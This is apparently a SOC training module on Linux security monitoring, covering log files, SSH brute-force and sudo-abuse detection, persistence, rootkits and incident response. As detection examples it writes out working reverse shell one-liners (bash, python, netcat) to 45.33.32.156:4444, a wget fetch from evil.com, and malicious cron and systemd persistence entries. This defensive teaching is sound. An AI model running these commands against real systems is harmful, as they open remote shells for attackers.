Module 10: Linux Security Monitoring

Linux powers most servers and cloud infrastructure. SOC analysts need to understand Linux logging, detect compromises, and investigate incidents on Linux systems.

Sub-Domains / Rooms

🔹 Linux Logging for SOC

Linux logs are the primary source of forensic data on Linux servers. Understanding where to look and what to look for is critical.

Critical Linux Log Files:

| Log File | Purpose | Key Things to Look For | |----------|---------|----------------------| | /var/log/auth.log | Authentication events | SSH logins, sudo usage, user additions | | /var/log/secure | RedHat auth events | Same as auth.log but for RHEL/CentOS | | /var/log/syslog | System events | Kernel messages, service starts/stops | | /var/log/messages | General system log | Hardware errors, systemd events | | /var/log/kern.log | Kernel messages | Module loading, driver issues | | /var/log/httpd/ | Apache web server logs | Web attacks, suspicious requests | | /var/log/nginx/ | Nginx web server logs | Same as Apache | | ~/.bash_history | User command history | All commands the user ran | | /var/log/cron | Cron job execution | Scheduled task activity | | audit.log | Linux Audit Daemon | System call auditing, file access |
Useful Linux SOC Commands:
last — Show all recent logins (reads /var/log/wtmp)
lastb — Show failed login attempts (reads /var/log/btmp)
who /var/log/wtmp — Display wtmp in human-readable format
ausearch -m LOGIN -i — Query audit logs for login events
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
→ Count failed SSH login attempts by source IP
grep "Accepted" /var/log/auth.log | grep -v "127.0.0.1"
→ Show all successful remote logins

🔹 Linux Threat Detection 1: SSH Brute Force & Sudo Abuse

SSH Brute Force Detection:
May 21 14:32:15 web-server sshd[12345]: Failed password for root from 45.33.32.156 port 54321 ssh2
May 21 14:32:16 web-server sshd[12346]: Failed password for root from 45.33.32.156 port 54322 ssh2
May 21 14:32:17 web-server sshd[12347]: Failed password for root from 45.33.32.156 port 54323 ssh2
... (500+ entries)
May 21 14:37:15 web-server sshd[12845]: Accepted password for root from 45.33.32.156 port 54821 ssh2
→ 500 failed attempts followed by success = brute force succeeded. Actions: check what the attacker did, rotate root password, disable root SSH login, deploy Fail2Ban.

Sudo Abuse Detection:
grep "sudo" /var/log/auth.log
May 21 14:38:00 web-server sudo: victim : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash
May 21 14:38:15 web-server sudo: victim : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/wget http://evil.com/tools.sh
May 21 14:38:30 web-server sudo: victim : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/chmod +x /tmp/tools.sh
→ User "victim" (compromised account) escalated to root and downloaded malicious tools. The auditd rule alerting on sudo use would catch this immediately.

🔹 Linux Threat Detection 2: Reverse Shells & Persistence

Reverse Shell Detection:
Check for unusual network connections:
ss -tulpn | grep ESTABLISHED
Proto Recv-Q Send-Q Local Address Foreign Address State
tcp ESTAB 0 0 10.0.1.50:443 45.33.32.156:4444 ESTABLISHED
→ A web server should accept connections (LISTEN), not establish outbound connections to suspicious IPs

Common Reverse Shell Commands (detect in bash_history):
bash -i >& /dev/tcp/45.33.32.156/4444 0>&1 — Classic bash reverse shell
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("45.33.32.156",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
nc -e /bin/sh 45.33.32.156 4444 — Netcat reverse shell

Linux Persistence Detection:
1. Cron jobs: Check /var/spool/cron/crontabs/ and /etc/cron.d/ for unexpected entries
*/5 * * * * /tmp/.hidden/update.sh — Runs every 5 minutes from /tmp
2. Systemd services: Check /etc/systemd/system/ for new service files
[Service]
ExecStart=/tmp/.hidden/malware
Restart=always
3. SSH authorized_keys: Check ~/.ssh/authorized_keys for unexpected public keys
4. LD_PRELOAD: Check /etc/ld.so.preload for suspicious library loading
5. .bashrc/.profile: Check for commands that execute on login

🔹 Linux Threat Detection 3: Rootkits & Kernel Threats

Rootkit Detection:
Rootkits hide their presence by modifying system binaries or kernel modules.

Symptoms:
- ls, ps, netstat show different results than expected
- System files have different sizes/checksums than known-good versions
- Kernel modules loaded that don't appear in any package database
- Hidden processes visible via /proc but not via ps command

Detection Tools:
chkrootkit — Check for known rootkit signatures
rkhunter — Rootkit hunter — checks file hashes, hidden ports, suspicious binaries
aide — Advanced Intrusion Detection Environment — file integrity checking
unhide — Detect hidden processes by comparing /proc with ps output

Example — Kernel Module Rootkit:
lsmod | grep -i "hide\|rootkit\|sneaky"
cat /proc/modules | grep -v "$(lsmod | cut -d' ' -f1)"
→ Look for kernel modules that don't appear in lsmod output

Privilege Escalation (CVE-2021-4034 — PwnKit):
pkexec --version — Check vulnerable version
journalctl -u pkexec --since "2021-01-01"
→ Check logs for pkexec exploitation attempts. The exploit triggers an out-of-bounds write that gives root shell.
Linux Incident Response Checklist
1. Isolate the host: Disconnect from network to prevent further damage or exfiltration
2. Collect volatile data: Running processes (ps aux), network connections (ss -tulpn), logged-in users (who), uptime
3. Collect persistent data: auth.log, bash_history, cron jobs, systemd services, SSH keys
4. Check for rootkits: Run chkrootkit, rkhunter, check kernel modules
5. Analyze timeline: Use the logs to determine when the compromise occurred and what actions were taken
6. Preserve evidence: Use dd or LiME to capture memory, tar -czf for disk evidence
7. Remediation: Patch vulnerability, rotate credentials, remove persistence, reimage if needed
